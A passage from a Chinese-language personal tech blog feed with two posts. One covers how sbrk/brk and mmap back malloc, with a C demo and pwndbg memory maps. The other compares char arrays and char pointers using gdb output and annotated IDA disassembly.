class="number">0x7ffff7dfd000</span> r-xp    <span class="number">26000</span> <span class="number">0</span>      /lib/x86_64-linux-gnu/ld<span class="number">-2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7fd3000</span>     <span class="number">0x7ffff7fd6000</span> rw-p     <span class="number">3000</span> <span class="number">0</span>      </span><br><span class="line">    <span class="number">0x7ffff7ff7000</span>     <span class="number">0x7ffff7ffa000</span> r--p     <span class="number">3000</span> <span class="number">0</span>      [vvar]</span><br><span class="line">    <span class="number">0x7ffff7ffa000</span>     <span class="number">0x7ffff7ffc000</span> r-xp     <span class="number">2000</span> <span class="number">0</span>      [vdso]</span><br><span class="line">    <span class="number">0x7ffff7ffc000</span>     <span class="number">0x7ffff7ffd000</span> r--p     <span class="number">1000</span> <span class="number">25000</span>  /lib/x86_64-linux-gnu/ld<span class="number">-2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7ffd000</span>     <span class="number">0x7ffff7ffe000</span> rw-p     <span class="number">1000</span> <span class="number">26000</span>  /lib/x86_64-linux-gnu/ld<span class="number">-2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7ffe000</span>     <span class="number">0x7ffff7fff000</span> rw-p     <span class="number">1000</span> <span class="number">0</span>      </span><br><span class="line">    <span class="number">0x7ffffffde000</span>     <span class="number">0x7ffffffff000</span> rw-p    <span class="number">21000</span> <span class="number">0</span>      [<span class="built_in">stack</span>]</span><br><span class="line"><span class="number">0xffffffffff600000</span> <span class="number">0xffffffffff601000</span> r-xp     <span class="number">1000</span> <span class="number">0</span>      [vsyscall]</span><br></pre></td></tr></table></figure><p>接下来不是0的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> bss_end;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">void</span>* ret;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"bss is %p\n"</span>,(<span class="keyword">char</span>*)(&amp;bss_end)+<span class="number">4</span>);</span><br><span class="line">ret = sbrk(<span class="number">0x1000</span>);</span><br><span class="line"><span class="keyword">if</span>(ret != (<span class="keyword">void</span>*)<span class="number">-1</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"start %p\n"</span>,ret);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span>* a = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"malloc is %p"</span>,a);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>直接看结果</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; vmmap</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">          <span class="number">0x400000</span>           <span class="number">0x401000</span> r-xp     <span class="number">1000</span> <span class="number">0</span>      /<span class="built_in">home</span>/pz1o/Desktop/mydemo/a</span><br><span class="line">          <span class="number">0x600000</span>           <span class="number">0x601000</span> r--p     <span class="number">1000</span> <span class="number">0</span>      /<span class="built_in">home</span>/pz1o/Desktop/mydemo/a</span><br><span class="line">          <span class="number">0x601000</span>           <span class="number">0x602000</span> rw-p     <span class="number">1000</span> <span class="number">1000</span>   /<span class="built_in">home</span>/pz1o/Desktop/mydemo/a</span><br><span class="line">          <span class="number">0x602000</span>           <span class="number">0x624000</span> rw-p    <span class="number">22000</span> <span class="number">0</span>      [heap]</span><br><span class="line">    <span class="number">0x7ffff7a0d000</span>     <span class="number">0x7ffff7bcd000</span> r-xp   <span class="number">1</span>c0000 <span class="number">0</span>      /lib/x86_64-linux-gnu/libc<span class="number">-2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7bcd000</span>     <span class="number">0x7ffff7dcd000</span> ---p   <span class="number">200000</span> <span class="number">1</span>c0000 /lib/x86_64-linux-gnu/libc<span class="number">-2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7dcd000</span>     <span class="number">0x7ffff7dd1000</span> r--p     <span class="number">4000</span> <span class="number">1</span>c0000 /lib/x86_64-linux-gnu/libc<span class="number">-2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7dd1000</span>     <span class="number">0x7ffff7dd3000</span> rw-p     <span class="number">2000</span> <span class="number">1</span>c4000 /lib/x86_64-linux-gnu/libc<span class="number">-2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7dd3000</span>     <span class="number">0x7ffff7dd7000</span> rw-p     <span class="number">4000</span> <span class="number">0</span>      </span><br><span class="line">    <span class="number">0x7ffff7dd7000</span>     <span class="number">0x7ffff7dfd000</span> r-xp    <span class="number">26000</span> <span class="number">0</span>      /lib/x86_64-linux-gnu/ld<span class="number">-2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7fd3000</span>     <span class="number">0x7ffff7fd6000</span> rw-p     <span class="number">3000</span> <span class="number">0</span>      </span><br><span class="line">    <span class="number">0x7ffff7ff7000</span>     <span class="number">0x7ffff7ffa000</span> r--p     <span class="number">3000</span> <span class="number">0</span>      [vvar]</span><br><span class="line">    <span class="number">0x7ffff7ffa000</span>     <span class="number">0x7ffff7ffc000</span> r-xp     <span class="number">2000</span> <span class="number">0</span>      [vdso]</span><br><span class="line">    <span class="number">0x7ffff7ffc000</span>     <span class="number">0x7ffff7ffd000</span> r--p     <span class="number">1000</span> <span class="number">25000</span>  /lib/x86_64-linux-gnu/ld<span class="number">-2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7ffd000</span>     <span class="number">0x7ffff7ffe000</span> rw-p     <span class="number">1000</span> <span class="number">26000</span>  /lib/x86_64-linux-gnu/ld<span class="number">-2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7ffe000</span>     <span class="number">0x7ffff7fff000</span> rw-p     <span class="number">1000</span> <span class="number">0</span>      </span><br><span class="line">    <span class="number">0x7ffffffde000</span>     <span class="number">0x7ffffffff000</span> rw-p    <span class="number">21000</span> <span class="number">0</span>      [<span class="built_in">stack</span>]</span><br><span class="line"><span class="number">0xffffffffff600000</span> <span class="number">0xffffffffff601000</span> r-xp     <span class="number">1000</span> <span class="number">0</span>      [vsyscall]</span><br><span class="line"></span><br><span class="line">bss is <span class="number">0x601050</span></span><br><span class="line">start <span class="number">0x623000</span></span><br></pre></td></tr></table></figure><h1 id="0x03-堆管理"><a href="#0x03-堆管理" class="headerlink" title="0x03 堆管理"></a>0x03 堆管理</h1><p>1）当开辟的空间小于 128K 时，调用 brk（）函数，malloc 的底层实现是系统调用函数 brk（），其主要移动指针program break</p><p>2）当开辟的空间大于 128K 时，mmap（）系统调用函数来在虚拟地址空间中（堆和栈中间，称为“文件映射区域”的地方）找一块空间来开辟。</p><h2 id="1-malloc小于128k"><a href="#1-malloc小于128k" class="headerlink" title="1. malloc小于128k"></a>1. malloc小于128k</h2><p>这时只使用brk分配</p><p><img src="/2021/04/17/%E7%90%86%E8%A7%A3sbrk%E5%92%8Cbrk/image-20210418233030728.png" alt="image-20210418233030728"></p><ol><li>进程启动的时候，其（虚拟）内存空间的初始布局如图所示</li><li>进程调用A=malloc(30K)以后，内存空间如图malloc函数会调用brk系统调用，将program break指针往高地址推30K，就完成虚拟内存分配</li></ol><p>这只是完成虚拟地址的分配，A这块内存现在还是没有物理页与之对应的，等到进程第一次读写A这块内存的时候，发生缺页中断，这个时候，内核才分配A这块内存对应的物理页。<strong>也就是说，如果用malloc分配了A这块内容，然后从来不访问它，那么，A对应的物理页是不会被分配的。</strong></p><h2 id="2-malloc大于128k"><a href="#2-malloc大于128k" class="headerlink" title="2. malloc大于128k"></a>2. malloc大于128k</h2><p>这时使用mmap分配</p><p><img src="/2021/04/17/%E7%90%86%E8%A7%A3sbrk%E5%92%8Cbrk/image-20210418233136531.png" alt="image-20210418233136531"></p><ol><li>进程分配C=malloc(200K),<strong>malloc函数分配内存，如果请求内存大于128K利用mmap系统调用，从堆和栈的中间分配一块虚拟内存</strong>，原因在于<strong>brk分配的内存需要等到高地址内存释放以后才能释放而mmap分配的内存可以单独释放。</strong></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x01-sbrk和brk函数原型&quot;&gt;&lt;a href=&quot;#0x01-sbrk和brk函数原型&quot; class=&quot;headerlink&quot; title=&quot;0x01 sbrk和brk函数原型&quot;&gt;&lt;/a&gt;0x01 sbrk和brk函数原型&lt;/h1&gt;&lt;figure class</summary>
      
    
    
    
    
    <category term="c" scheme="https://pz1o.top/tags/c/"/>
    
  </entry>
  
  <entry>
    <title>char类型</title>
    <link href="https://pz1o.top/2021/04/13/char%E7%B1%BB%E5%9E%8B/"/>
    <id>https://pz1o.top/2021/04/13/char%E7%B1%BB%E5%9E%8B/</id>
    <published>2021-04-13T05:04:42.000Z</published>
    <updated>2021-04-18T08:35:21.218Z</updated>
    
    <content type="html"><![CDATA[<p>我是fw</p><p>char[],char*,char的区别</p><h1 id="0x01-代码编译"><a href="#0x01-代码编译" class="headerlink" title="0x01 代码编译"></a>0x01 代码编译</h1><p><code>gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.12)</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> a[<span class="number">10</span>]=&#123;<span class="string">'a'</span>,<span class="string">'a'</span>,<span class="string">'a'</span>,<span class="string">'a'</span>,<span class="string">'a'</span>,<span class="string">'a'</span>,<span class="string">'a'</span>&#125;;</span><br><span class="line">    <span class="keyword">char</span> m[]=&#123;<span class="string">'a'</span>,<span class="string">"b"</span>,<span class="string">'c'</span>,<span class="string">'d'</span>&#125;;</span><br><span class="line">    <span class="keyword">char</span> n[]=&#123;<span class="string">'m'</span>,<span class="string">"nnnn"</span>,<span class="string">'o'</span>,<span class="string">'d'</span>,<span class="string">'p'</span>,<span class="string">"q"</span>&#125;;</span><br><span class="line">    <span class="keyword">char</span>* b=<span class="string">"bbbbbbb"</span>;</span><br><span class="line">    <span class="keyword">char</span> c[<span class="number">10</span>]=<span class="string">"ccccccc"</span>;</span><br><span class="line">    <span class="keyword">char</span>* d[<span class="number">10</span>]=&#123;<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>,<span class="string">'d'</span>,<span class="string">'e'</span>,<span class="string">'f'</span>,<span class="string">'g'</span>&#125;;</span><br><span class="line">    <span class="keyword">char</span>* e[<span class="number">10</span>]=&#123;<span class="string">"a"</span>,<span class="string">"b"</span>,<span class="string">"c"</span>,<span class="string">"d"</span>,<span class="string">"e"</span>,<span class="string">"f"</span>,<span class="string">"g"</span>&#125;;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> f[<span class="number">10</span>]=&#123;<span class="string">"fffffff"</span>&#125;;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span>* g=<span class="string">"ggggggg"</span>;</span><br><span class="line">    <span class="keyword">char</span>* <span class="keyword">const</span> h=<span class="string">"hhhhhhh"</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span>* <span class="keyword">const</span> i = <span class="string">"iiiiiii"</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="0x02-代码调试"><a href="#0x02-代码调试" class="headerlink" title="0x02 代码调试"></a>0x02 代码调试</h1><p>直接下到最后的断点</p><p>当前的变量</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; info local</span><br><span class="line">a = <span class="string">"aaaaaaa\000\000"</span></span><br><span class="line">m = <span class="string">"a\204cd"</span></span><br><span class="line">n = <span class="string">"m\206odp\213"</span></span><br><span class="line">b = <span class="number">0x40078d</span> <span class="string">"bbbbbbb"</span></span><br><span class="line">c = <span class="string">"ccccccc\000\000"</span></span><br><span class="line">d = &#123;<span class="number">0x61</span> &lt;error: Cannot access memory at address <span class="number">0x61</span>&gt;, <span class="number">0x62</span> &lt;error: Cannot access memory at address <span class="number">0x62</span>&gt;, <span class="number">0x63</span> &lt;error: Cannot access memory at address <span class="number">0x63</span>&gt;, <span class="number">0x64</span> &lt;error: Cannot access memory at address <span class="number">0x64</span>&gt;, <span class="number">0x65</span> &lt;error: Cannot access memory at address <span class="number">0x65</span>&gt;, <span class="number">0x66</span> &lt;error: Cannot access memory at address <span class="number">0x66</span>&gt;, <span class="number">0x67</span> &lt;error: Cannot access memory at address <span class="number">0x67</span>&gt;, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>&#125;</span><br><span class="line">e = &#123;<span class="number">0x400795</span> <span class="string">"a"</span>, <span class="number">0x400784</span> <span class="string">"b"</span>, <span class="number">0x400797</span> <span class="string">"c"</span>, <span class="number">0x400799</span> <span class="string">"d"</span>, <span class="number">0x40079b</span> <span class="string">"e"</span>, <span class="number">0x40079d</span> <span class="string">"f"</span>, <span class="number">0x40079f</span> <span class="string">"g"</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>&#125;</span><br><span class="line">f = <span class="string">"fffffff\000\000"</span></span><br><span class="line">g = <span class="number">0x4007a1</span> <span class="string">"ggggggg"</span></span><br><span class="line">h = <span class="number">0x4007a9</span> <span class="string">"hhhhhhh"</span></span><br><span class="line">i = <span class="number">0x4007b1</span> <span class="string">"iiiiiii"</span></span><br><span class="line">pwndbg&gt; x/<span class="number">40</span>gx <span class="number">0x7fffffffdb80</span></span><br><span class="line"><span class="number">0x7fffffffdb80</span>:<span class="number">0x000000000040078d</span><span class="number">0x00000000004007a1</span></span><br><span class="line">    <span class="keyword">char</span>* b<span class="keyword">const</span> <span class="keyword">char</span>* g</span><br><span class="line"><span class="number">0x7fffffffdb90</span>:<span class="number">0x00000000004007a9</span><span class="number">0x00000000004007b1</span></span><br><span class="line">    <span class="keyword">char</span>* <span class="keyword">const</span> h<span class="keyword">const</span> <span class="keyword">char</span>* <span class="keyword">const</span> i</span><br><span class="line"><span class="number">0x7fffffffdba0</span>:<span class="number">0x0000000000000061</span><span class="number">0x0000000000000062</span></span><br><span class="line">    <span class="keyword">char</span>* d[<span class="number">0</span>]...</span><br><span class="line"><span class="number">0x7fffffffdbb0</span>:<span class="number">0x0000000000000063</span><span class="number">0x0000000000000064</span></span><br><span class="line"><span class="number">0x7fffffffdbc0</span>:<span class="number">0x0000000000000065</span><span class="number">0x0000000000000066</span></span><br><span class="line"><span class="number">0x7fffffffdbd0</span>:<span class="number">0x0000000000000067</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffffffdbe0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line">    <span class="keyword">char</span>* d[<span class="number">8</span>]<span class="keyword">char</span>* d[<span class="number">9</span>]</span><br><span class="line"><span class="number">0x7fffffffdbf0</span>:<span class="number">0x0000000000400795</span><span class="number">0x0000000000400784</span></span><br><span class="line">    <span class="keyword">char</span>* e[<span class="number">0</span>]...</span><br><span class="line"><span class="number">0x7fffffffdc00</span>:<span class="number">0x0000000000400797</span><span class="number">0x0000000000400799</span></span><br><span class="line"><span class="number">0x7fffffffdc10</span>:<span class="number">0x000000000040079b</span><span class="number">0x000000000040079d</span></span><br><span class="line"><span class="number">0x7fffffffdc20</span>:<span class="number">0x000000000040079f</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffffffdc30</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line">    <span class="keyword">char</span>* e[<span class="number">8</span>]<span class="keyword">char</span>* e[<span class="number">9</span>]</span><br><span class="line"><span class="number">0x7fffffffdc40</span>:<span class="number">0x0000000064638461</span><span class="number">0x00007fffffffdcc0</span></span><br><span class="line">    <span class="keyword">char</span> m[]</span><br><span class="line"><span class="number">0x7fffffffdc50</span>:<span class="number">0x00008b70646f866d</span><span class="number">0x0000000000f0b5ff</span></span><br><span class="line">    <span class="keyword">char</span> n[]</span><br><span class="line"><span class="number">0x7fffffffdc60</span>:<span class="number">0x0061616161616161</span><span class="number">0x0000000000400000</span></span><br><span class="line">    <span class="keyword">char</span> a[<span class="number">10</span>]</span><br><span class="line"><span class="number">0x7fffffffdc70</span>:<span class="number">0x0063636363636363</span><span class="number">0x0000000000000000</span></span><br><span class="line">    <span class="keyword">char</span> c[<span class="number">10</span>]</span><br><span class="line"><span class="number">0x7fffffffdc80</span>:<span class="number">0x0066666666666666</span><span class="number">0x0000000000400000</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> f[<span class="number">10</span>]</span><br><span class="line"><span class="number">0x7fffffffdc90</span>:<span class="number">0x00007fffffffdd80</span><span class="number">0x60ff615f4dd88b00</span></span><br><span class="line"><span class="number">0x7fffffffdca0</span>:<span class="number">0x0000000000400700</span><span class="number">0x00007ffff7a2d840</span></span><br><span class="line"><span class="number">0x7fffffffdcb0</span>:<span class="number">0x0000000000000001</span><span class="number">0x00007fffffffdd88</span></span><br></pre></td></tr></table></figure><h1 id="0x03-IDA分析"><a href="#0x03-IDA分析" class="headerlink" title="0x03 IDA分析"></a>0x03 IDA分析</h1><p>拿IDA来看一下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line">.<span class="built_in">text</span>:<span class="number">0000000000400546</span> ; __unwind &#123;</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">0000000000400546</span>                 push    rbp</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">0000000000400547</span>                 mov     rbp, rsp</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">000000000040054</span>A                 sub     rsp, <span class="number">120</span>h</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">0000000000400551</span>                 mov     rax, fs:<span class="number">28</span>h</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">000000000040055</span>A                 mov     [rbp<span class="number">-8</span>], rax</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">000000000040055</span>E                 <span class="keyword">xor</span>     eax, eax</span><br><span class="line"><span class="comment">//初始canary和预留栈</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//初始a为0，也就是说char a[10]会将10个字节都置为0</span></span><br><span class="line">.<span class="built_in">text</span>:<span class="number">0000000000400560</span>                 mov     qword ptr [rbp<span class="number">-40</span>h], <span class="number">0</span></span><br><span class="line">.<span class="built_in">text</span>:<span class="number">0000000000400568</span>                 mov     <span class="keyword">word</span> ptr [rbp<span class="number">-38</span>h], <span class="number">0</span></span><br><span class="line">.<span class="built_in">text</span>:<span class="number">000000000040056</span>E                 mov     <span class="keyword">byte</span> ptr [rbp<span class="number">-40</span>h], <span class="number">61</span>h</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">0000000000400572</span>                 mov     <span class="keyword">byte</span> ptr [rbp<span class="number">-3F</span>h], <span class="number">61</span>h</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">0000000000400576</span>                 mov     <span class="keyword">byte</span> ptr [rbp<span class="number">-3</span>Eh], <span class="number">61</span>h</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">000000000040057</span>A                 mov     <span class="keyword">byte</span> ptr [rbp<span class="number">-3</span>Dh], <span class="number">61</span>h</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">000000000040057</span>E                 mov     <span class="keyword">byte</span> ptr [rbp<span class="number">-3</span>Ch], <span class="number">61</span>h</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">0000000000400582</span>                 mov     <span class="keyword">byte</span> ptr [rbp<span class="number">-3B</span>h], <span class="number">61</span>h</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">0000000000400586</span>                 mov     <span class="keyword">byte</span> ptr [rbp<span class="number">-3</span>Ah], <span class="number">61</span>h</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//赋值给char m[]</span></span><br><span class="line">.<span class="built_in">text</span>:<span class="number">000000000040058</span>A                 mov     <span class="keyword">byte</span> ptr [rbp<span class="number">-60</span>h], <span class="number">61</span>h</span><br><span class="line">    <span class="comment">//将只读字符串b赋值给al</span></span><br><span class="line">.<span class="built_in">text</span>:<span class="number">000000000040058</span>E                 mov     eax, offset unk_400784</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">0000000000400593</span>                 mov     [rbp<span class="number">-5F</span>h], al</span><br><span class="line">    <span class="comment">//这里出现了问题，将寄存器低位(0x84)赋值给b中</span></span><br><span class="line">.<span class="built_in">text</span>:<span class="number">0000000000400596</span>                 mov     <span class="keyword">byte</span> ptr [rbp<span class="number">-5</span>Eh], <span class="number">63</span>h</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">000000000040059</span>A                 mov     <span class="keyword">byte</span> ptr [rbp<span class="number">-5</span>Dh], <span class="number">64</span>h</span><br><span class="line">    <span class="comment">//我们也就理解了为什么上面" "赋值给char[]时会出现错误</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//赋值给char n[]</span></span><br><span class="line">.<span class="built_in">text</span>:<span class="number">000000000040059</span>E                 mov     <span class="keyword">byte</span> ptr [rbp<span class="number">-50</span>h], <span class="number">6</span>Dh</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">00000000004005</span>A2                 mov     eax, offset aNnnn ; <span class="string">"nnnn"</span></span><br><span class="line">.<span class="built_in">text</span>:<span class="number">00000000004005</span>A7                 mov     [rbp<span class="number">-4F</span>h], al</span><br><span class="line">    <span class="comment">//和上面类似</span></span><br><span class="line">.<span class="built_in">text</span>:<span class="number">00000000004005</span>AA                 mov     <span class="keyword">byte</span> ptr [rbp<span class="number">-4</span>Eh], <span class="number">6F</span>h</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">00000000004005</span>AE                 mov     <span class="keyword">byte</span> ptr [rbp<span class="number">-4</span>Dh], <span class="number">64</span>h</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">00000000004005B</span>2                 mov     <span class="keyword">byte</span> ptr [rbp<span class="number">-4</span>Ch], <span class="number">70</span>h</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">00000000004005B</span>6                 mov     eax, offset aQ  ; <span class="string">"q"</span></span><br><span class="line">.<span class="built_in">text</span>:<span class="number">00000000004005B</span>B                 mov     [rbp<span class="number">-4B</span>h], al</span><br><span class="line">    <span class="comment">//和上面类似</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//赋值给char* b 此时栈上的地址只是指向b字符串的地址</span></span><br><span class="line">.<span class="built_in">text</span>:<span class="number">00000000004005B</span>E                 mov     qword ptr [rbp<span class="number">-120</span>h], offset aBbbbbbb ; <span class="string">"bbbbbbb"</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//赋值给char c[10]</span></span><br><span class="line">.<span class="built_in">text</span>:<span class="number">00000000004005</span>C9                 mov     rax, <span class="number">63636363636363</span>h</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">00000000004005</span>D3                 mov     [rbp<span class="number">-30</span>h], rax</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">00000000004005</span>D7                 mov     <span class="keyword">word</span> ptr [rbp<span class="number">-28</span>h], <span class="number">0</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//赋值给char* d[10]</span></span><br><span class="line">.<span class="built_in">text</span>:<span class="number">00000000004005</span>DD                 lea     rdx, [rbp<span class="number">-100</span>h]</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">00000000004005E4</span>                 mov     eax, <span class="number">0</span></span><br><span class="line">.<span class="built_in">text</span>:<span class="number">00000000004005E9</span>                 mov     ecx, <span class="number">0</span>Ah</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">00000000004005</span>EE                 mov     rdi, rdx</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">00000000004005F</span>1                 rep stosq <span class="comment">//将eax中的值复制到[rdi]处，且循环次数为ecx次</span></span><br><span class="line">    <span class="comment">//赋值是8字节</span></span><br><span class="line">.<span class="built_in">text</span>:<span class="number">00000000004005F</span>4                 mov     qword ptr [rbp<span class="number">-100</span>h], <span class="number">61</span>h</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">00000000004005F</span>F                 mov     qword ptr [rbp<span class="number">-0F</span>8h], <span class="number">62</span>h</span><br><span class="line">.<span 